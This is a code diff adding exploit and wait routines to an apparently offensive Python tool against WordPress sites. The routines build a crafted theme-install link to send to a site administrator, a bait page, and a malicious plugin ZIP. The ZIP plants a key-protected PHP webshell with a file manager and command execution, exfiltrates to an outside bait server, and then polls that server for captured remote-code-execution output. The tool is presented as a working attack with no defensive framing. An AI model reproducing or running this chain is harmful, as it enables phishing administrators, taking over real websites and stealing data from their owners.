@@ -80,7 +80,7 @@ UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
 # ── Hard denylist — never target these (not our assets) ─────────────
 DENYLIST = []
 
-DEFAULT_BAIT = 'https://103-31-205-161.sslip.io'
+DEFAULT_BAIT = 'https://REPLACE-WITH-PUBLIC-IP.sslip.io'
 TOKEN_FILE = Path('/root/.x2s_token')
 
 BANNER = """
@@ -950,6 +950,121 @@ def do_xss(s: requests.Session, args) -> int:
     else:
         log("no --exploit-wait set; print-only mode (no live verification)")
     return 0
+
+
+def do_exploit(s: requests.Session, args) -> int:
+    target = norm(args.target)
+    token = load_token(args.token)
+    slug = 'c2s-' + uuid.uuid4().hex[:8]
+    shell_key = secrets.token_hex(16)
+    ws_file = f"{target}/wp-content/plugins/{slug}/{slug}.php"
+
+    crafted, negative = stage1_url(target, args.theme)
+    zip_url = f"{norm(args.bait_server)}/c2s-zip"
+    bait_html = build_bait_html(target, args.theme, args.ajax_action,
+                                slug, zip_url, args.delay)
+    zip_bytes = build_plugin_zip(slug, norm(args.bait_server),
+                                 cmd=args.cmd, shell_key=shell_key)
+
+    print("\n" + "=" * 70)
+    print("STAGE 1 — crafted theme-install URL (send to admin):")
+    print("  " + crafted)
+    print("\nNEGATIVE CONTROL (preview only, no auto-install):")
+    print("  " + negative)
+    print("=" * 70, flush=True)
+
+    ok = False
+    if token:
+        log(f"pushing bait+zip to {norm(args.bait_server)} ...")
+        ok = push_c2s_state(norm(args.bait_server), token, target,
+                            bait_html, zip_bytes)
+    else:
+        log("no token found (/root/.x2s_token, --token, $C2S_TOKEN) — "
+            "skipping push")
+        log("FIX: you are NOT running on the VM where /root/.x2s_token "
+            "lives.")
+        log("     re-run with:  --token <TOKEN>   (or: C2S_TOKEN=*** "
+            "python3 ... )")
+        log("     TOKEN = contents of /root/.x2s_token on the VM "
+            "(ask Cleopatra for it — never paste it into chat)")
+
+    if ok:
+        bait_page = f"{norm(args.bait_server)}/c2s-bait"
+        print("\n" + "=" * 70)
+        print("BAIT PAGE (victim opens this ONE link):")
+        print("  " + bait_page)
+        print("Flow: opens stage-1 in popup -> admin signs in (no click")
+        print("      needed) -> auto-install of the chain theme")
+        print(f"      -> after {args.delay}s auto-submits stage 2 (AJAX")
+        print("      loads inactive theme PHP -> plugin ZIP from")
+        print("      " + zip_url)
+        print("      -> webshell included + exfils to /c2s-callback")
+        print("=" * 70)
+        print("LIVE WEBSHELL (akses langsung dari browser, SETELAH install):")
+        print("  " + ws_file)
+        print("    [1] URL tanpa param              = exfil proof + marker")
+        print("    [2] URL + ?c2s_k=<key>           = PANEL: system info,")
+        print("        WordPress info, file manager (perm/owner/size/mtime),")
+        print("        view file, stat detail, + form command")
+        print("    [3] URL + ?c2s_k=<key>&c=<cmd>   = output command di browser")
+        print("  contoh panel:")
+        print("    " + ws_file + "?c2s_k=" + shell_key)
+        print("  contoh (id):")
+        print("    " + ws_file + "?c2s_k=" + shell_key + "&c=id")
+        print("  KEY webshell: " + shell_key)
+        print("  (key hanya ada di output ini + ZIP — simpan, ini satu-satunya")
+        print("   cara akses interaktif; tanpa key = exfil-only)")
+        print("=" * 70, flush=True)
+    else:
+        Path('/root/c2s_bait_local.html').write_text(bait_html)
+        Path('/root/c2s_plugin_local.zip').write_bytes(zip_bytes)
+        print("\n" + "=" * 70)
+        print("PUSH FAILED — manual fallback files written:")
+        print("  /root/c2s_bait_local.html  (host this bait page)")
+        print("  /root/c2s_plugin_local.zip (host the ZIP, update URL)")
+        print("Fix the bait server or use the files above, then re-run.")
+        print("=" * 70, flush=True)
+
+    if args.exploit_wait and args.exploit_wait > 0:
+        log(f"waiting {args.exploit_wait}s for stage-1 install...")
+        if verify_stage1(s, target, args.theme, args.exploit_wait):
+            return 2
+        log("stage-1 install not observed within window")
+
+    if args.wait and args.wait > 0:
+        return do_wait(s, args, target)
+    return 0
+
+
+def do_wait(s: requests.Session, args, target: str) -> int:
+    token = load_token(args.token)
+    if not token:
+        die("waiting requires a token (/root/.x2s_token, --token, "
+            "$C2S_TOKEN)")
+    log(f"waiting up to {args.wait}s for RCE callback "
+        f"(bait: {norm(args.bait_server)}/c2s-status)...")
+    caps = poll_captures(norm(args.bait_server), token, args.wait)
+    types = {c.get('type') for c in caps}
+    rce_c = [c for c in caps if c.get('type') == 'c2s_rce' and is_real_rce(c)]
+    cmd_c = [c for c in caps if c.get('type') == 'c2s_cmd' and is_real_rce(c)]
+    if rce_c:
+        print("\n[+] RCE CONFIRMED (c2s_rce captured, real target data)",
+              flush=True)
+        for c in rce_c:
+            print("    " + (c.get('data') or '').replace('\n', ' | ')[:300],
+                  flush=True)
+    if cmd_c:
+        print("\n[+] COMMAND OUTPUT (" + (args.cmd or 'c2s_cmd') + ")",
+              flush=True)
+        for c in cmd_c:
+            print("-" * 60, flush=True)
+            print(c.get('data') or '(empty)', flush=True)
+            print("-" * 60, flush=True)
+    if 'c2s_theme_php' in types:
+        print("\n[!] theme PHP loaded but plugin exfil not captured — "
+              "check /c2s-callback reachability from victim host",
+              flush=True)
+    return 2 if (rce_c or cmd_c) else 0
 
 
 def main() -> int:
